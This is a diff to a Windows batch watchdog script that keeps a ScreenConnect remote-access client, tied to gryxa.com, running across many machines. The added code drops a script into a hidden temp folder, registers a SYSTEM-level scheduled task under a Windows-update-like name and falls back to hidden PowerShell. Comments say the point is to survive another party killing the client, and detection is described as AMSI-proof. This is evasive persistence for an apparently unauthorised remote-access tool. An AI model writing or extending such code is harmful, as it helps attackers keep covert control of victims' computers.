@@ -1,6 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M65
+rem  OWN_MON  BUILD 20260804M66
+rem  M66: NEVER sc stop Gryxa on force (M64 bounce left 60+ Stopped when Guest killed mon mid-tick).
+rem       PUSH-START/RECONNECT = detached start-only; Stopped → multi-start no HEAL.
 rem  M65: never bypass HEAL rate-limit on 1060; keep gryxa_msi.lock (no delete before queue) — stops panel dupes.
 rem  M64: PUSH-RECONNECT under OBSERVE — bounce Gryxa / HEAL 1060; never clear watcher; no REINSTALL.
 rem  M63: OBSERVE still blocks REINSTALL;/x — allows HEAL start + 1060 /i (G10).
@@ -631,9 +633,11 @@ if exist "%WD%\force_gryxa.new" (
     )
   )
 )
-rem OBSERVE blocks classic REINSTALL force only — PUSH-RECONNECT still runs (bounce/HEAL)
+rem OBSERVE blocks classic REINSTALL force only — PUSH-RECONNECT / PUSH-START still run
 set "FORCE_RECONNECT=0"
-if exist "%WD%\force_gryxa.new" findstr /C:"RECONNECT" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_RECONNECT=1"
+if exist "%WD%\force_gryxa.new" (
+  findstr /C:"RECONNECT" /C:"PUSH-START" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_RECONNECT=1"
+)
 if "!OBSERVE!"=="1" if "!FORCE_RECONNECT!"=="0" set "FORCE_G=0"
 
 rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
@@ -682,26 +686,19 @@ if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
 )
 echo gryxa_health=!GH!>>"%LOG%"
 
-rem FORCE: PUSH-RECONNECT = bounce live Gryxa (panel wipe) or HEAL 1060; classic PUSH = 1060 REINSTALL only
+rem FORCE: PUSH-START/RECONNECT = NEVER sc stop (M64 bounce + Guest kill left fleet Stopped). Detached start or HEAL 1060.
 if "%FORCE_G%"=="1" (
   if "!FORCE_RECONNECT!"=="1" (
-    echo gryxa_force_RECONNECT observe=!OBSERVE!>>"%LOG%"
+    echo gryxa_force_START_ONLY observe=!OBSERVE! ok=!GRYXA_OK!>>"%LOG%"
     if "!GRYXA_OK!"=="1" (
-      echo gryxa_force_reconnect_bounce>>"%LOG%"
-      sc stop "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-      timeout /t 4 /nobreak >nul
-      sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
-      sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-      timeout /t 3 /nobreak >nul
-      sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+      echo gryxa_force_already_running_ack>>"%LOG%"
     ) else (
       sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
       if not errorlevel 1 (
-        echo gryxa_force_reconnect_start_only>>"%LOG%"
-        sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
-        sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+        echo gryxa_force_detached_start>>"%LOG%"
+        call :QueueGryxaStartOnly
       ) else (
-        echo gryxa_force_reconnect_heal_1060>>"%LOG%"
+        echo gryxa_force_start_heal_1060>>"%LOG%"
         call :QueueGryxaHeal HEAL
       )
     )
@@ -719,8 +716,7 @@ if "%FORCE_G%"=="1" (
     sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
     if not errorlevel 1 (
       echo gryxa_force_skip_svc_exists_start_only>>"%LOG%"
-      sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
-      sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+      call :QueueGryxaStartOnly
     ) else (
       echo gryxa_force_push_reinstall_1060_only>>"%LOG%"
       call :QueueGryxaHeal REINSTALL
@@ -1000,6 +996,28 @@ if !_PN! LSS !GRYXA_FLOOR! exit /b 1
 if !_PN! EQU 0 exit /b 1
 exit /b 0
 
+:QueueGryxaStartOnly
+rem Detached sc start — survives sevrz Guest 10s kill (never sc stop)
+set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
+if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
+> "%SystemRoot%\Temp\.upd\gryxa_start_once.cmd" (
+  echo @echo off
+  echo sc config "%GSVC%" start= auto
+  echo sc start "%GSVC%"
+  echo timeout /t 8 /nobreak
+  echo sc start "%GSVC%"
+  echo timeout /t 8 /nobreak
+  echo sc start "%GSVC%"
+  echo schtasks /Delete /TN WucacheGryxaStartOnce /F
+)
+schtasks /Create /TN "WucacheGryxaStartOnce" /TR "cmd.exe /c %SystemRoot%\Temp\.upd\gryxa_start_once.cmd" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+schtasks /Run /TN "WucacheGryxaStartOnce" >nul 2>&1
+if errorlevel 1 (
+  powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%SystemRoot%\Temp\.upd\gryxa_start_once.cmd' -WindowStyle Hidden" >nul 2>&1
+)
+echo gryxa_start_only_queued>>"%LOG%"
+exit /b 0
+
 :QueueGryxaHeal
 rem %1=REINSTALL|HEAL — OBSERVE blocks REINSTALL only; HEAL (start/1060-i) allowed
 rem M65: ALWAYS rate-limit (20m if 1060, 90m if svc exists). Never delete gryxa_msi.lock here.
@@ -1008,6 +1026,15 @@ if "%HEALMODE%"=="" set "HEALMODE=HEAL"
 if exist "%WD%\observe.flag" if /I "!HEALMODE!"=="REINSTALL" (
   echo gryxa_reinstall_blocked_OBSERVE>>"%LOG%"
   exit /b 0
+)
+rem Stopped service: start-only, never msiexec HEAL (avoids /x + panel dupes)
+sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if not errorlevel 1 (
+  if /I "!HEALMODE!"=="HEAL" (
+    echo gryxa_heal_redirect_start_only_svc_exists>>"%LOG%"
+    call :QueueGryxaStartOnly
+    exit /b 0
+  )
 )
 rem in-flight lock: another heal/install already running
 if exist "%WD%\gryxa_msi.lock" (
@@ -1075,7 +1102,7 @@ if "!NEED_LOOP!"=="1" (
 exit /b 0
 
 :EnsureGryxaMust
-rem M59: start-only when svc exists; queue HEAL only on hard 1060 (G9 HEAL never /x)
+rem M66: Stopped → detached multi-start only; HEAL only on hard 1060
 set "GRYXA_OK=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
@@ -1091,17 +1118,8 @@ if not errorlevel 1 (
 )
 sc query "%GSVC%" >nul 2>&1
 if not errorlevel 1 (
-  echo gryxa_must_start_only>>"%LOG%"
-  sc config "%GSVC%" start= auto >nul 2>&1
-  sc start "%GSVC%" >nul 2>&1
-  timeout /t 8 /nobreak >nul
-  sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-  if not errorlevel 1 (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%GSVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-    if not errorlevel 1 set "GRYXA_OK=1"
-  )
-  if "%GRYXA_OK%"=="0" echo gryxa_must_svc_exists_no_heal>>"%LOG%"
-  if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down_no_x>>"%LOG%")
+  echo gryxa_must_start_only_detached>>"%LOG%"
+  call :QueueGryxaStartOnly
   exit /b 0
 )
 echo gryxa_must_1060_queue_heal>>"%LOG%"
